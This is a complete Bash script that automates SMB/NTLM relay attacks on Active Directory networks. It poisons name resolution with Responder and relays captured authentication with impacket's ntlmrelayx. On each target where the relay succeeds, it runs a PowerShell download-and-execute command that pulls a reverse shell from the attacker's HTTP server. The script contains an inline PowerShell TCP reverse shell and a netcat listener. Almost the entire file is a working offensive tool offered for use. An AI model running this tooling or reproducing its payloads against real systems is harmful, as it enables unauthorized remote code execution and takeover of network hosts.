#!/bin/bash

# Name: SMB AutoRelay
# Author: chesire
#
# Description: SMB AutoRelay provides the automation of SMB/NTLM Relay technique for pentesting and red teaming exercises in active directory environments.
# Usage: ./smbAutoRelay.sh -i <interface> -t <TargetsFilePath>
# Example: ./smbAutoRelay -i eth0 -t ./targets.txt
# Note: targets.txt only store a list of IP addresses that you want to perform the relay.
#

# ################## DISCLAIMER ##################
# I AM NOT RESPONSIBLE OF THE MISUSE OF THIS TOOL.
# YOU RUN IT AT YOUR OWN RISK. PLEASE BE KIND :)

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function cleaning(){
		
	tmux kill-session -t 'smbautorelay*' &>/dev/null
	if [[ -e $(pwd)/shell.ps1 || -e $(pwd)/impacket/hostsStatus.tmp || -e $(pwd)/impacket/targets.txt ]];then
		if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Cleaning this mess...\n"; sleep 0.3; fi
		rm -f $(pwd)/shell.ps1 $(pwd)/impacket/hostsStatus.tmp $(pwd)/impacket/targets.txt &>/dev/null
	fi
	
}

function badExit(){

	cleaning

    nc_PID=$(netstat -tnualp | grep '/nc' 2>/dev/null | grep 'LISTEN' 2>/dev/null | grep $lport 2>/dev/null | awk '{print substr($NF, 1, length($NF)-3)}')
    if [[ ! -z $nc_PID ]];then
	  kill -9 $nc_PID &>/dev/null
	  wait $nc_PID &>/dev/null
    fi

    if [ ! -z $terminal_nc_PID ];then
	  kill -9 $terminal_nc_PID &>/dev/null
	  wait $terminal_nc_PID &>/dev/null
    fi

	tput cnorm; exit 1

}

function goodExit(){

    disown $terminal_nc_PID &>/dev/null
	cleaning
	tput cnorm; exit 0

}

function ctrl_c(){

	echo -e "\n${redColour}[D:]${endColour} Keyboard interruption detected!\n"; badExit

}

function banner(){
	echo -e "${greenColour}"
    echo -e "   _____ __  _______     ___         __        ____       __
  / ___//  |/  / __ )   /   | __  __/ /_____  / __ \___  / /___ ___  __
  \__ \/ /|_/ / __  |  / /| |/ / / / __/ __ \/ /_/ / _ \/ / __ \`/ / / /
 ___/ / /  / / /_/ /  / ___ / /_/ / /_/ /_/ / _, _/  __/ / /_/ / /_/ /
/____/_/  /_/_____/  /_/  |_\__,_/\__/\____/_/ |_|\___/_/\__,_/\__, /
                                                              /____/   by chesire ${purpleColour}🐱${endColour}"
	echo -e "${endColour}"
	sleep 0.3
}

function helpMenu(){

	echo -e "${blueColour}Usage: ./smbAutoRelay.sh -i <interface> -t <file> [-q] [-d]${endColour}\n"
		echo -e "\t${purpleColour}i) Interface to listen for NetNTLM hashes${endColour}\n"
		echo -e "\t${purpleColour}t) File path to the list of targets (IP addresses one per line)${endColour}\n"
		echo -e "\t${purpleColour}r) Remove all installed software${endColour}\n"
		echo -e "\t${purpleColour}d) Discard the installation process${endColour}\n"
		echo -e "\t${purpleColour}q) Shhh! be quiet...${endColour}\n"
		echo -e "\t${purpleColour}h) Shows this help menu${endColour}\n"
	goodExit

}

function checkApt(){

	if [ "$1" == "net-tools" ];then which ifconfig &>/dev/null; else which $1 &>/dev/null; fi

	if [ $? -eq 0 ];then
		if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} $1 installed\n";sleep 0.3; fi
	else
		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} $1 not installed, installing..."; sleep 0.3; fi

		apt install -y $1 &>/dev/null
		if [ "$1" == "net-tools" ];then which ifconfig &>/dev/null; else which $1 &>/dev/null; fi
		if [ $? -eq 0 ];then
			if [ ! -z $quiet ]; then echo -e "\t${greenColour}[:)]${endColour} $1 installed\n"; sleep 0.3; fi
			echo "$1" >> $(pwd)/uninstall.txt
		else
			echo -e "\t${redColour}[D:]${endColour} Something bad happened, $1 could not be installed. Try installing manually and run me again\n"; sleep 0.3; badExit
		fi
	fi

}

function makeBck(){

	if [ ! -e "$(pwd)/responder/Responder.conf.old" ];then
		if [ ! -z $quiet ];then echo -e "\t${blueColour}[:*]${endColour} Making copy of '$(pwd)/responder/Responder.conf' to '$(pwd)/responder/Responder.conf.old'\n"; sleep 0.3; fi
		cp $(pwd)/responder/Responder.conf $(pwd)/responder/Responder.conf.old
	fi

}

function checkProgramsNeeded(){

	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Updating apt...\n"; sleep 0.3; fi
	apt update &>/dev/null
	if [ $? -ne 0 ];then echo -e "\t${redColour}[:S]${endColour} Wait... no apt? Tools needed are installed through it.\n"; fi

	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Checking for dependencies needed...\n"; sleep 0.3; fi

	programs=(tmux rlwrap python python3 netcat wget xterm net-tools)
	for program in "${programs[@]}"; do checkApt $program; done

	python $(pwd)/responder/Responder.py -h &>/dev/null
    	if [ $? -eq 0 ];then
        	if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} responder installed\n"; sleep 0.3; fi
        	makeBck
	else
		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} responder not installed, installing at '$(pwd)/responder' directory";sleep 0.3; fi

        if [ -e $(pwd)/responder ];then rm -rf $(pwd)/responder &>/dev/null; fi

		mkdir $(pwd)/responder; git clone https://github.com/SpiderLabs/Responder.git $(pwd)/responder &>/dev/null
		test -f $(pwd)/responder/Responder.py &>/dev/null
      		if [ $? -eq 0 ]; then
			chmod u+x $(pwd)/responder/Responder.py
			if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} responder installed\n"; sleep 0.3; fi
        			makeBck; echo "responder" >> $(pwd)/uninstall.txt
		else
			echo -e "\t${redColour}[D:]${endColour} Something bad happened, responder could not be installed. Try installing manually at '$(pwd)/responder' directory and run me again\n"; sleep 0.3; badExit
		fi
	fi

	python3 $(pwd)/impacket/ntlmrelayx.py -h &>/dev/null
	if [ $? -eq 0 ];then
		if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} impacket installed\n";sleep 0.3; fi
	else
		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} impacket not installed, installing at '$(pwd)/impacket' directory"; sleep 0.3; fi
		
        	if [ -e $(pwd)/impacket ];then rm -rf $(pwd)/impacket &>/dev/null; fi

		mkdir $(pwd)/impacket &>/dev/null; git clone https://github.com/SecureAuthCorp/impacket.git $(pwd)/impacket &>/dev/null
		python3 -m pip install -q impacket &>/dev/null

		python3 $(pwd)/impacket/examples/ntlmrelayx.py -h &>/dev/null 
		if [ $? -eq 0 ];then
			cp $(pwd)/impacket/examples/ntlmrelayx.py $(pwd)/impacket/ntlmrelayx.py
			chmod u+x $(pwd)/impacket/ntlmrelayx.py
			if [ ! -z $quiet  ]; then echo -e "\t${greenColour}[:)]${endColour} impacket installed\n"; sleep 0.3; fi
			echo "impacket" >> uninstall.txt
		else
			echo -e "\t${redColour}[:S]${endColour} Something bad happened, impacket could not be installed. Try installing manually at '$(pwd)/impacket' directory and run me again\n"; sleep 0.3; badExit
		fi
	fi

}

function checkDependency(){

	if [ "$1" == "ntlmrelayx.py" ];then
		test -f "$(pwd)/impacket/ntlmrelayx.py" &>/dev/null
	elif [ "$1" == "responder" ];then
		test -f "$(pwd)/responder/Responder.py" &>/dev/null
	elif [ "$1" == "net-tools" ];then
		which ifconfig &>/dev/null
	else
		which $1 &>/dev/null
	fi
	
	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} $1 not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi

}

function checkTargets(){
	
	checkDependency "ntlmrelayx.py"
	
	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Checking targets...\n"; sleep 0.3; fi
	
	if [ -e $(pwd)/impacket/targets.txt ];then rm -f $(pwd)/impacket/targets.txt &>/dev/null; fi

	while read line; do 
		nc -nvzw 1 $line 445 &>/dev/null; if [ $? -ne 0 ];then
			if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} Target $line is not alive or has the SMB service disable.\n"; sleep 0.3; fi
		else
			echo $line >> $(pwd)/impacket/targets.txt
		fi
	done < $targets

	if [ ! -e $(pwd)/impacket/targets.txt ];then echo -e "${redColour}[:(]${endColour} No targets left! Go find more!\n"; badExit; fi

	cat $(pwd)/impacket/targets.txt | sort -u > $(pwd)/targets.tmp
	mv $(pwd)/targets.tmp $(pwd)/impacket/targets.txt

	while read line; do
		if [ "$(netstat -tunalp | grep '\/nc' | grep 'ESTABLISHED' | grep "$line")" != "" ];then
			if [ ! -z $quiet ];then echo -e "\t${yellowColour}[-,-]${endColour} You already have a shell at $line! Please do not bully and remove it from targets.\n"; fi
			echo $line >> $(pwd)/impacket/hostsStatus.tmp
		fi
	done < $(pwd)/impacket/targets.txt

	if [[ "$(wc -l $(pwd)/impacket/hostsStatus.tmp 2>/dev/null | awk '{print $1}')" == "$(wc -l $(pwd)/impacket/targets.txt 2>/dev/null | awk '{print $1}')" ]];then
		if [ ! -z $quiet ];then echo -e "${greenColour}[:D]${endColour} Wow! All targets pwned! You really are a H4X0R!\n"; goodExit; fi
	fi

}

function checkResponderConfig(){

    	checkDependency "responder"

	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Checking responder config..."; fi

	SMBStatus=$(grep "^SMB" $(pwd)/responder/Responder.conf | head -1 | awk '{print $3}')
	HTTPStatus=$(grep "^HTTP" $(pwd)/responder/Responder.conf | head -1 | awk '{print $3}')

	if [[ $HTTPStatus == "Off" && $SMBStatus == "Off" ]];then
		if [ ! -z $quiet ];then echo -ne ""; fi
	else
		if [ ! -z $quiet ];then echo -ne "\n"; fi
	fi

	if [ "$SMBStatus" == "On" ]; then
		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} Responder SMB server enabled, switching off..."; sleep 0.3; fi
		
		sed 's/SMB = On/SMB = Off/' $(pwd)/responder/Responder.conf > $(pwd)/responder/Responder.conf.tmp
		mv $(pwd)/responder/Responder.conf.tmp $(pwd)/responder/Responder.conf
		rm -f $(pwd)/responder/Responder.conf.tmp 
	fi

	if [ "$HTTPStatus" == "On" ]; then
		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} Responder HTTP server enabled, switching off..."; sleep 0.3; fi
		
		which $(pwd)/responder/Responder.conf.tmp &>/dev/null
		sed 's/HTTP = On/HTTP = Off/' $(pwd)/responder/Responder.conf > $(pwd)/responder/Responder.conf.tmp
		mv $(pwd)/responder/Responder.conf.tmp $(pwd)/responder/Responder.conf
		rm -f $(pwd)/responder/Responder.conf.tmp
	fi

	if [[ $HTTPStatus == "Off" && $SMBStatus == "Off" ]];then if [ ! -z $quiet ];then echo -ne "\n"; fi; fi
	if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} Responder SMB and HTTP servers disabled. Starting Relay Attack...\n"; sleep 0.3; fi
	
}

function bTmux(){
	tmux kill-session -t "smbautorelay*" &>/dev/null
	echo -e "${redColour}[D:]${endColour} Tmux blew up... That hurts! Try running me again\n"; badExit
}

function updateNtlmRelayxLog(){

	while (true);do
		tmux capture-pane -p -S - > $(pwd)/impacket/ntlmrelayx.log && sleep 1
		if [ $? -ne 0 ];then bTmux; fi
	done

}

function targetStatus(){

	status=$(grep 'Authenticating against smb://'$1 $(pwd)/impacket/ntlmrelayx.log 2>/dev/null | tail -1 | awk '{print $NF}')

	if [[ "$status" == "SUCCEED" || "$status" == "SUCCEE" ]];then
		echo -e "\t${greenColour}[:)]${endColour} Authentication against $1 succeed! Dropping the payload..."; sleep 2
		
		if [ "$(netstat -tnualp | grep '/nc' | grep "ESTABLISHED" | grep "$1")" == "" ];then 
			echo -e "\t${redColour}[:(]${endColour} Unable to execute the payload. '$(pwd)/impacket/ntlmrelayx.log' file is your friend.\n"
			echo $1 >> $(pwd)/impacket/hostsStatus.tmp
		else echo; fi
	elif [ "$status" == "FAILED" ];then
		echo -e "\t${redColour}[:(]${endColour} Authentication against $1 failed! Not cool...\n"; sleep 0.3
		echo $1 >> $(pwd)/impacket/hostsStatus.tmp
	fi

}

function relayingAttack(){

   	checkDependency "tmux"

	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Starting Tmux server...\n"; sleep 0.3; fi
	tmux start-server &>/dev/null
	if [ $? -ne 0 ];then bTmux else sleep 1; fi

	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Creating Tmux session 'smbautorelay'...\n"; sleep 0.3; fi
	tmux new-session -d -t "smbautorelay" &>/dev/null
	if [ $? -ne 0 ];then bTmux; else sleep 0.3; fi

	tmux rename-window "smbautorelay" &>/dev/null && tmux split-window -h &>/dev/null
	if [ $? -ne 0 ];then bTmux; else sleep 0.3; fi

	paneID=0; tmux select-pane -t $paneID > /dev/null 2>&1
	if [ $? -ne 0 ];then 
		let paneID+=1; tmux select-pane -t $paneID > /dev/null 2>&1
		if [ $? -ne 0 ];then bTmux; else sleep 0.3; fi
	fi

	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Tmux setted up. Launching responder...\n"; sleep 0.3; fi

	tmux send-keys "python $(pwd)/responder/Responder.py -I $interface -drw" C-m &>/dev/null && tmux swap-pane -d &>/dev/null 
	if [ $? -ne 0 ];then bTmux; else sleep 0.3; fi

    	checkDependency "net-tools"

	lhost=$(ifconfig $interface | grep "inet\s" | awk '{print $2}')
	openPorts=($(netstat -tunalp | grep -v 'Active\|Proto' | grep 'tcp' | awk '{print $4}' | awk -F: '{print $NF}' | sort -u | xargs))
	for openPort in "${openPorts[@]}"; do
		lport=$(($RANDOM%65535)); if [ $lport -ne $openPort ];then break; fi
	done

	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Downloading PowerShell payload from nishang repository...\n"; sleep 0.3; fi

	checkDependency "wget"

	wget 'https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1' -O $(pwd)/shell.ps1 &>/dev/null
	if [ ! -e "$(pwd)/shell.ps1" ];then
		if [ ! -z $quiet ];then echo -e "${yellowColour}[:S]${endColour} Unable to get nishang payload. Let's try crafting it manually...\n"; sleep 0.3; fi
		rshell='$client = New-Object System.Net.Sockets.TCPClient("'$lhost'",'$lport');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
		echo $rshell > $(pwd)/shell.ps1
	else
		echo 'Invoke-PowerShellTcp -Reverse -IPAddress '$lhost' -Port '$lport >> $(pwd)/shell.ps1
	fi
	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Serving PowerShell payload at $lhost:8000...\n"; sleep 0.3; fi

	let paneID+=1; tmux select-pane -t $paneID &>/dev/null && tmux send-keys "python3 -m http.server" C-m &>/dev/null && tmux split-window &>/dev/null
	if [ $? -ne 0 ];then bTmux; else sleep 0.3; fi

	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Launching ntlmrelayx.py from impacket...\n"; sleep 0.3; fi

	python3 $(pwd)/ntlmrelayx.py -h &>/dev/null
	if [ $? -ne 0 ];then python3 -m pip install -q impacket &>/dev/null; fi

	command="powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost:8000/shell.ps1')"
	let paneID+=1; tmux select-pane -t $paneID &>/dev/null && tmux send-keys -t $paneID "cd $(pwd)/impacket && python3 $(pwd)/impacket/ntlmrelayx.py -tf $(pwd)/impacket/targets.txt -smb2support -c \"$command\"" C-m &>/dev/null
	if [ $? -ne 0 ];then bTmux; fi

	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Opening port $lport...\n"; sleep 0.3; fi

	checkDependency "rlwrap"

	terminal=$(ps -o comm= -p "$(($(ps -o ppid= -p "$(($(ps -o sid= -p "$$")))")))")
	if [ "${terminal:(-1)}" == "-" ];then terminal="${terminal::-1}"; fi
	
	which $terminal &>/dev/null
	if [ $? -eq 0 ];then
		ncCommand="tput setaf 7; rlwrap nc -lvvnp $lport"
		if [ "$terminal" == "qterminal" ];then ncCommand="nc -lvvnp $lport"; fi # Kali's qterminal emulator does not like rlwrap :( 
		
		$terminal -e $ncCommand &>/dev/null &
		terminal_nc_PID=$! && sleep 2
		if [ "$(netstat -tnualp | grep '/nc' | grep 'LISTEN' | grep $lport)" == "" ];then
			$terminal --window --hide-menubar -e "$SHELL -c '$ncCommand'" &>/dev/null &
			terminal_nc_PID=$! && sleep 2
    		fi
	else
		checkDependency "xterm"
		xterm -T 'XTerm' -e "$SHELL -c '$ncCommand'" &>/dev/null &
	    	terminal_nc_PID=$!
	fi

	while [ "$(netstat -tnualp | grep '/nc' | grep 'LISTEN' | grep $lport)" == "" ];do sleep 1; done

	
    if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Relay attack deployed, waiting for LLMNR/NBT-NS request...\n"; fi

	portStatus='LISTEN'

	touch $(pwd)/impacket/hostsStatus.tmp &>/dev/null

	tmux resize-pane -Z -L 8 &>/dev/null
	if [ $? -ne 0 ];then bTmux; fi
	
	updateNtlmRelayxLog &>/dev/null &
	updateNtlmRelayxLog=$!

	while [ "$portStatus" == "LISTEN" ];do
		while read line; do
			if [[ "$portStatus" == "LISTEN" && "$(grep $line $(pwd)/impacket/hostsStatus.tmp 2>/dev/null)" == '' ]];then targetStatus "$line"; fi
			portStatus=$(netstat -tnualp | grep $lport | awk '{print $6}' | sort -u);
		done < $(pwd)/impacket/targets.txt

		if [[ "$(wc -l $(pwd)/impacket/hostsStatus.tmp 2>/dev/null | awk '{print $1}')" == "$(wc -l $(pwd)/impacket/targets.txt 2>/dev/null | awk '{print $1}')" ]];then
			echo -e "\t${redColour}[:(]${endColour} No targets left to perform the realy! Go find more!\n"; break
		fi
		portStatus=$(netstat -tnualp | grep '/nc' | grep "$lport" | tail -1 | awk '{print $6}');
	done

	kill -9 $updateNtlmRelayxLog &>/dev/null
	wait $updateNtlmRelayxLog &>/dev/null

	tmux capture-pane -p -S - > $(pwd)/impacket/ntlmrelayx.log
	if [ $? -ne 0 ];then bTmux; fi

	rhost=$(netstat -tnualp | grep '/nc' | grep "$rhost:$lport" | awk '{print $5}' | tail -1 | awk -F: '{print $1}')
	checkrhost=''
	while read line; do if [ "$rhost" == "$line" ];then checkrhost=1; fi; done < $targets

	if [[ "$portStatus" == "ESTABLISHED" && $checkrhost -eq 1 ]];then
		echo -e "${greenColour}[:D]${endColour} Relaying against $rhost successful! Enjoy your shell!\n"; sleep 0.3
	else
		echo -e "${redColour}[:(]${endColour} Relay unsuccessful! Maybe you need more coffee\n"; badExit
	fi

	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Killing Tmux session 'smbautorelay'...\n"; sleep 0.3; fi
	
	goodExit

}

function rmsw(){

	if [[ ! -e $(pwd)/uninstall.txt || $(grep -v '#' $(pwd)/uninstall.txt) == '' ]];then echo -e "${greenColour}[:)]${endColour} Nothing to uninstall\n"; goodExit; fi

	echo -ne "${redColour}[:!]${endColour} Are you sure you want to uninstall $(grep -v '#' $(pwd)/uninstall.txt | xargs | sed 's/ /, /g')? (y/n): "; read confirm

	while [[ "$confirm" != "y" && "$confirm" != "n" ]];do
		echo -e "\n"; echo -ne "${redColour}[:!]${endColour} Please type y (yes) or n (no): ";read confirm; echo -e "\n"
	done

	if [ "$confirm" == "y" ];then 
		echo -e "\n$yellowColour[:!]${endColour} Uninstalling process started, please do not stop the process...\n"; sleep 0.3

		while read line; do
			if [[ ${line:0:1} != '#' && "$line" != '' ]];then
				if [ "$line" == "responder" ];then 
					rm -rf $(pwd)/responder &>/dev/null
				elif [ "$line" == "impacket" ];then
					python3 -m pip uninstall -y impacket &>/dev/null
					rm -rf $(pwd)/impacket &>/dev/null
				else 
					apt remove -y $line &>/dev/null
				fi
				
				if [ $? -ne 0 ];then
					if [ ! -z $quiet ];then echo -e "\t${redColour}[D:]${endColour} Unable to uninstall $line. Try to do it manually\n"; sleep 0.3; fi
				else
					if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} $line uninstaled\n"; sleep 0.3; fi
				fi
			fi
		done < $(pwd)/uninstall.txt
		rm -f $(pwd)/uninstall.txt; goodExit
	else
		echo; goodExit
	fi

}

# Main function
clear; banner

if [ ! -e $(pwd)/uninstall.txt ];then
	echo -e "# #################################### IMPORTANT! ####################################\n#\n# TRY TO NOT DELETE THIS FILE\n" >> uninstall.txt
	echo -e "# This was created automatically by smbAutoRelay.sh" >> uninstall.txt
	echo -e "# Here it will store the programs installed in case they are not found in this machine" >> uninstall.txt
	echo -e "# Be aware that if removed, smbAutoRelay.sh will suppose there is nothing to uninstall.\n" >> uninstall.txt
fi

if [ "$(id -u)" == 0 ]; then
	tput civis
	quiet='1'
	remove=''
    	discard=0
	declare -i parameter_counter=0;
	
	while getopts "qri:t:hd" arg; do
		case $arg in
			q) quiet='';;
			r) remove='1';;
			i) interface=$OPTARG; let parameter_counter+=1 ;;
			t) targets=$OPTARG; let parameter_counter+=1 ;;
			h) helpMenu;;
            		d) discard=1;;
		esac
	done

	if [ ! -z $remove ];then rmsw; fi

	if [ $parameter_counter -ne 2 ]; then
		helpMenu
	else
		if [ -z $quiet ];then echo -e "${yellowColour}[:x]${endColour} ...\n" ; fi
		iLookUp=$(ip addr | grep $interface | awk -F: '{print $2}' | sed 's/\s*//g')
		if [ "$interface" !=  "$iLookUp" ];then echo -e "${redColour}[D:]${endColour} $interface interface not found\n"; badExit; fi

		if [ ! -e $targets ]; then
			echo -e "${redColour}[D:]${endColour} $targets file does not exists\n"; badExit
		elif [ -z "$(cat "$targets")" ];then
			echo -e "${redColour}[D:]${endColour} $targets file is empty\n"; badExit
		else
			while read line; do
				echo $line | grep -E "^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$" &>/dev/null
				if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Could not read the content of $targets.\n"; badExit; fi
			done < $targets
		fi

		if [ $discard == 0 ];then checkProgramsNeeded; fi
		checkTargets
		checkResponderConfig
		relayingAttack
	fi
	goodExit

else echo -e "\n${redColour}[D:]${endColour} Super powers not activated!\n${blueColour}[:*]${endColour} You need root privileges to run this tool!"; badExit; fi
